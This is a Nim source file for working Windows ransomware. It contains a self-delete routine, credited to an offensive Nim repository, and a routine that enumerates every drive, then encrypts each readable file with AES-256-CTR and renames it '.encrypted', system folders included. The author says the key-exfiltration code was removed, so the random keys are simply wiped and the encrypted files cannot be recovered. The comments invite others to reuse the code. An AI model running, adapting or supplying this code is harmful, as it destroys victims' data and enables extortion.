import strformat
import base64
import nimcrypto
import os
import winim
import monocypher
import sysrandom
import system
import strutils


#self-delete function taken from offensive nim repository
var DS_STREAM_RENAME = newWideCString(":wtfbbq")

proc ds_open_handle(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = DS_STREAM_RENAME
    fRename.FileNameLength = sizeof(lpwStream).DWORD;
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE;

    return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)

when isMainModule:
    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath));

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        echo "[-] Failed to get the current module handle"
        quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo "[-] Failed to acquire handle to current running process"
        quit(QuitFailure)

    echo "[*] Attempting to rename file name"
    if not ds_rename_handle(hCurrent).bool:
        echo "[-] Failed to rename to stream"
        quit(QuitFailure)

    echo "[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle"
    CloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo "[-] Failed to reopen current module"
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        echo "[-] Failed to set delete deposition"
        quit(QuitFailure)

    echo "[*] Closing handle to trigger deletion deposition"
    CloseHandle(hCurrent)

    if not PathFileExistsW(addr wcPath[0]).bool:
        echo "[*] File deleted successfully"
#end of self-delete function taken from offensive nim repository

#get all drives on a machine for encrytpion
proc getDrives(): seq[string] =
  var buffer: array[128, char]
  let len = GetLogicalDriveStringsA(buffer.len.cint, buffer[0].addr)
  result = @[]
  var i = 0
  while i < len:
    let drive = $cast[cstring](buffer[i].addr)
    if drive.len > 0:
      result.add(drive)
    i += drive.len + 1

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

#check if file can be opened
proc canOpenFile(file: string): bool =
  try:
    let f = open(file, fmRead)  # Try opening the file in read mode
    close(f)  # If successful, close the file immediately
    return true
  except:
    return false  # If an error occurs, return false

#basically the main encryption function
proc fuckme(pathes: tuple[kind: PathComponent, path: string],expandedKey:array[0..31, byte] , iv:array[0..15, byte]): void = 
  for file in walkDirRec pathes.path: 
    let fileSplit = splitFile(file)
    if fileSplit.ext != ".encrypted" and canOpenFile(file): 
      try:
        var
            inFileContents: string = readFile(file) # Getting the content of the file
            plaintext: seq[byte] = toByteSeq(inFileContents) # Formating the content to bytes
            ectx: CTR[aes256]
            key: array[aes256.sizeKey, byte]
            encrypted: seq[byte] = newSeq[byte](len(plaintext))

        copyMem(addr key[0], addr expandedKey, len(expandedKey))

        ectx.init(key, iv)
        ectx.encrypt(plaintext, encrypted)
        ectx.clear()

        let encodedCrypted = encode(encrypted) # This var contains the encrypted data
        let finalFile = file & ".encrypted" # Giving a new extension
        moveFile(file, finalFile) # Changing the file extension
        writeFile(finalFile, encodedCrypted) # Writing the encrypted data to the file (Deletes everything  that was there before)
        echo fmt"[*] Encrypting: {file}"
      except:
        continue

#main function i planed to add function to send keys to decifer encoded files to remote server buuuuuuuuut im lazy and got bored of this project so there are some rudiments.... i guesss u can use them for ur ideas
#also u can delete debug echo funtions 
proc Main(): void = 
  echo "innit"
  let drives = getDrives()
  let expandedKey = getRandomBytes(sizeof(Key))
  let iv = getRandomBytes(16)
  let nonce = getRandomBytes(sizeof(Nonce))
  let theirPublicKey = getRandomBytes(sizeof(Key))
  let secretKey = getRandomBytes(sizeof(Key))
#very bad try into encrypting keys(i had no idea what i was doing there so yeaaah it is very bad)
  let sharedKey = crypto_key_exchange(secretKey, theirPublicKey)
  let plaintext = encode(expandedKey) & "//\\" & encode(iv)
  let (mac, ciphertext) = crypto_lock(sharedKey, nonce, cast[seq[byte]](plaintext))
  let shitshow =  encode(sharedKey) & "//\\" & encode(nonce) & "//\\" & encode(mac) & "//\\" & encode(ciphertext)

  echo "wipeeeeeeeeeee"
#there were cut out function to send http request to server with data butttttttttt i cut it out soooooooooo we have some code that probably better to delete but again im lazy af
  defer: crypto_wipe(nonce)
  defer: crypto_wipe(theirPublicKey)
  defer: crypto_wipe(secretKey)
  defer: crypto_wipe(sharedKey)
  defer: crypto_wipe(mac)
  defer: crypto_wipe(ciphertext)

  echo "fuck ur data"
#the idea here was to encrypt all files but system ones encrypt last 
  for drive in drives:
    for pathes in walkDir(drive, false, true, true): # For any file/folder inside our folder
      fuckme(pathes, expandedKey, iv)
    for pathes in walkDir(drive, false, true, false):
      if "Windows" in $pathes.path:
        fuckme(pathes, expandedKey, iv)  


#defering keys for encryption
  defer: crypto_wipe(expandedKey)
  defer: crypto_wipe(iv)


when isMainModule:
  Main()
